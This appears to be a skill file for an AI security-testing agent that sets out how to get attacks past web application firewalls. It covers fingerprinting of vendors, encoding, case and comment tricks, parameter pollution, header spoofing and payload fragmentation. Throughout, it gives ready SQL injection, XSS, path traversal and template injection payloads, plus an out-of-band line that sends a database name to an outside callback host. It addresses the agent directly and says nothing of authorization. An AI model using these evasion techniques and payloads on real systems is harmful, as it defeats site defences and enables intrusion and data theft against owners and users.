---
name: waf-bypass
description: Methodology for bypassing Web Application Firewalls using encoding, obfuscation, and parser differentials
---

# WAF Bypass Methodology

Modern Web Application Firewalls (WAFs) use pattern matching, behavioral analysis, and ML models to detect attacks. Effective bypass requires understanding parser differentials between the WAF and the backend application, exploiting normalization gaps, and crafting payloads that survive WAF inspection but execute on the backend.

**CRITICAL**: This skill teaches METHODOLOGY, not static payload lists. Generate payloads contextually based on what you learn about the WAF and backend.

## Detection Strategies

### Identifying WAF Presence

**Response Signatures**
- HTTP headers: `X-CDN`, `Server: cloudflare`, `X-WAF-Event-Info`
- Status codes: 403/406/429 with vendor-specific error pages
- Cookie patterns: `__cfduid`, `citrix_ns_id`, `F5_*`
- Response timing anomalies (additional hop latency)

**Testing Methods**
- Send known malicious payloads: `<script>alert(1)</script>`, `' OR '1'='1`
- Observe block patterns vs allow patterns
- Note which parameters/paths trigger blocks
- Check if blocks are consistent or statistical

### WAF Fingerprinting

**Cloudflare**
- Headers: `CF-RAY`, `CF-Cache-Status`
- Error page: "Attention Required" / "Error 1020"
- IP ranges: AS13335
- Challenge pages with JavaScript + cookies

**AWS WAF**
- Headers: `X-AMZ-*`, `X-Cache: Error from cloudfront`
- Error: "403 Forbidden" with minimal HTML
- Pattern: Blocks often on SQLi keywords but allows encoding

**Akamai**
- Headers: `Akamai-*`, `X-Akamai-Session-Info`
- Error: "Reference #" codes
- Advanced behavioral analysis
- Multi-layer inspection (edge + origin)

**ModSecurity / OWASP CRS**
- Headers: `Server: Apache`, `Server: nginx`
- Error patterns from OWASP rules
- Predictable regex-based blocking
- Often deployed on-premise

**Imperva / Incapsula**
- Cookie: `incap_ses_*`, `visid_incap_*`
- Error: "Request unsuccessful"
- Advanced bot detection
- Client-side JavaScript challenges

## Bypass Techniques

### 1. Encoding and Character Manipulation

**URL Encoding Variations**
- Double encoding: `%2527` → `%27` → `'`
- Hex encoding: `0x27` instead of `'`
- Unicode encoding: `%u0027` (IIS specific)
- Mixed case in encoding: `%2F` vs `%2f`

**Character Set Abuse**
- UTF-8 overlong encoding: `0xC0 0xAF` → `/`
- UTF-7: `+ADw-script+AD4-` → `<script>`
- Double-encoded UTF-8
- Alternative representations: `ˈ` (U+02C8) may parse as `'`

**Case Manipulation**
- Mixed case: `<ScRiPt>`, `sElEcT`
- WAFs often case-normalize, but backend may not
- Bypass regex: `(?i)script` vs exact matching

**Comment Injection**
- SQL: `'/**/OR/**/1=1`, `'/*!50000OR*/1=1`
- MySQL version comments: `/*!50000SELECT*/`
- Multi-line comments: `'/*\n*/OR/*\n*/1=1`

### 2. Parser Differentials

**HTTP Parameter Pollution (HPP)**
- Send duplicate parameters: `?id=1&id=' OR 1=1--`
- Different servers handle differently:
  - Apache/PHP: Last value wins
  - Tomcat: First value wins
  - IIS/ASP.NET: Concatenates with comma
- WAF may check first, backend uses last

**Content-Type Confusion**
- Send JSON as `application/x-www-form-urlencoded`
- Send XML with `Content-Type: application/json`
- Missing charset: `text/html` vs `text/html; charset=utf-8`
- Polyglot payloads that parse differently

**HTTP Method Abuse**
- GET params blocked? Try POST body
- POST blocked? Try PUT/PATCH
- Use HTTP method override headers:
  - `X-HTTP-Method-Override: DELETE`
  - `X-Method-Override: PUT`

**Header Injection**
- `X-Forwarded-For`: May bypass IP-based rules
- `X-Real-IP`: Override source IP detection
- `X-Originating-IP`: Spoof internal requests
- `Host` header manipulation for virtual host routing

### 3. Whitespace and Separator Abuse

**Alternative Separators**
- Tabs instead of spaces: `' OR\t1=1`
- Newlines: `' OR\n1=1`
- Multiple spaces: `'  OR  1=1`
- Null bytes: `'%00OR%001=1` (language-dependent)

**Whitespace Normalization**
- HTML: `<img%09src=x%09onerror=alert(1)>`
- SQL: `'OR/**/1=1`
- Mixed whitespace types: space, tab, newline, form-feed

### 4. Syntax Variations

**SQL Alternatives**
- Logical operators: `AND` → `&&`, `OR` → `||`
- Comments: `--` → `#` → `;%00` → `/**/`
- String concat: `+` vs `||` vs `CONCAT()`
- Case expressions: `WHERE 1` → `WHERE 'a'='a'`
- Boolean literals: `true` → `1` → `'1'='1'`

**XSS Alternatives**
- Event handlers: `onclick` → `onmouseover` → `onerror` → `onload`
- Tag variations: `<script>` → `<svg>` → `<img>` → `<iframe>`
- No quotes: `<img src=x onerror=alert(1)>`
- No parentheses: `<img src=x onerror=alert`1`>`
- Template literals: ``${alert(1)}``

**Path Traversal Alternatives**
- `../` → `..\` → `..;/` → `..%2F` → `....//`
- Absolute paths: `/etc/passwd` → `/etc//passwd` → `/etc/./passwd`
- Case variation (Windows): `/WINDOWS/system32`

### 5. Timing and Ordering

**Request Chaining**
- First request: Normal (trains WAF)
- Subsequent: Malicious (may pass if WAF caches/whitelists)
- Session-based bypasses after establishing trust

**Payload Fragmentation**
- Split payload across multiple params/headers
- Backend assembles, WAF inspects individually
- Example: `?a=';DROP&b= TABLE users--`

**Race Conditions**
- Concurrent requests may overwhelm WAF processing
- Async backend processing while WAF still analyzing

### 6. Platform-Specific Techniques

**PHP-Specific**
- Parse array notation: `?id[]=1&id[]=2` → backend gets array
- Null byte injection: `/image.php?file=../../etc/passwd%00.jpg`
- Type juggling: `'0e123' == '0e456'` (both equal 0)

**ASP.NET-Specific**
- `~/` path shortcuts
- Case-insensitive file extensions: `.asP`, `.AsPx`
- Unicode normalization differences
- ViewState deserialize bugs

**Java-Specific**
- Null byte: works in older Java versions
- Classpath tricks: `%c0%ae%c0%ae%c0%af`
- Spring expression language: `${7*7}`
- URL normalization differences in Tomcat vs Jetty

**Node.js-Specific**
- Prototype pollution: `?__proto__[admin]=true`
- Query parser differences: `qs` vs `querystring`
- Template injection: `{{7*7}}`

## Adaptive Testing Workflow

### Step 1: Establish Baseline
- Send clean requests to understand normal responses
- Note response times, headers, status codes
- Identify dynamic vs static content

### Step 2: Trigger Detection
- Send known malicious patterns
- Observe WAF block signatures
- Note which payloads are blocked vs allowed
- Identify blocked keywords, patterns, or characters

### Step 3: Hypothesis Formation
- What detection method is used? (regex, keyword, ML)
- What normalization happens? (case, encoding, whitespace)
- Which layer inspects? (edge, reverse proxy, backend)
- Is detection signature-based or behavioral?

### Step 4: Iterative Refinement
- Apply bypass techniques based on hypothesis
- Test one modification at a time
- Observe changes in WAF behavior
- Build a mental model of what passes/blocks

### Step 5: Payload Construction
- Combine successful techniques
- Generate contextual payloads (NOT from static lists)
- Test incrementally (add complexity gradually)
- Verify execution on backend

## Detection Evasion Patterns

**Pattern: Keyword Splitting**
- Blocked: `SELECT * FROM users`
- Bypass: `SEL/**/ECT * FR/**/OM users`
- Bypass: `S'+'EL'+'ECT * F'+'ROM users`

**Pattern: Encoding Layers**
- Blocked: `<script>alert(1)</script>`
- Bypass: `%3Cscript%3Ealert(1)%3C/script%3E`
- Bypass: Double-encode first character only: `%253Cscript>`

**Pattern: Case Mixing**
- Blocked: `union select`
- Bypass: `UnIoN SeLeCt`
- Bypass: `uNIon sELEct` (different pattern)

**Pattern: Alternative Syntax**
- Blocked: `OR 1=1`
- Bypass: `OR 'a'='a'`
- Bypass: `|| 1`
- Bypass: `OR true`

**Pattern: Whitespace Substitution**
- Blocked: `' OR 1=1--`
- Bypass: `'OR/**/1=1--`
- Bypass: `'%09OR%091=1--`
- Bypass: `'%0AOR%0A1=1--`

## Testing Checklist

When facing a WAF, systematically test:

1. **Encoding**
   - [ ] URL encoding (single, double, mixed case)
   - [ ] Unicode variations
   - [ ] HTML entities
   - [ ] Hex/octal representations

2. **Character Substitution**
   - [ ] Mixed case
   - [ ] Comments insertion
   - [ ] Alternative operators
   - [ ] Whitespace variations

3. **Protocol Manipulation**
   - [ ] HTTP method changes
   - [ ] Parameter pollution
   - [ ] Content-Type switching
   - [ ] Header injection

4. **Payload Fragmentation**
   - [ ] Split across parameters
   - [ ] Split across headers
   - [ ] Timing-based delivery
   - [ ] Multipart encoding

5. **Backend-Specific**
   - [ ] Platform quirks (PHP/ASP.NET/Java/Node)
   - [ ] Parser differentials
   - [ ] Type confusion
   - [ ] Array/object notation

## Integration with Other Tools

**Use OAST for Blind Bypass Detection**
- WAF blocks visible payloads but may allow callbacks
- Test: `UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.oast.pro\\a'))`
- If OOB fires, WAF bypass successful even without visible response

**Use Fuzzer for Iteration**
- Generate variations of successful payloads
- Test encoding/case/whitespace combinations in parallel
- Analyze response patterns for partial successes

**Use Coverage Tracker**
- Record which bypass techniques work on which surfaces
- Avoid re-testing known blocks
- Identify untested parameter/path combinations

## Key Principles

1. **Understand the Stack**: WAF → Reverse Proxy → Application Server → Backend Logic
2. **Test One Variable**: Change encoding OR case OR syntax, not all at once
3. **Build Mental Model**: What passes vs blocks informs next hypothesis
4. **Generate Contextually**: No static lists - create payloads based on observations
5. **Verify Execution**: Bypass means EXECUTION on backend, not just WAF pass

## Common Mistakes

- Testing too many variations at once (can't isolate what works)
- Using wordlists without understanding context
- Giving up after first block (iterative refinement is key)
- Not verifying backend execution (WAF pass ≠ exploit success)
- Ignoring timing/behavior changes (may indicate partial success)
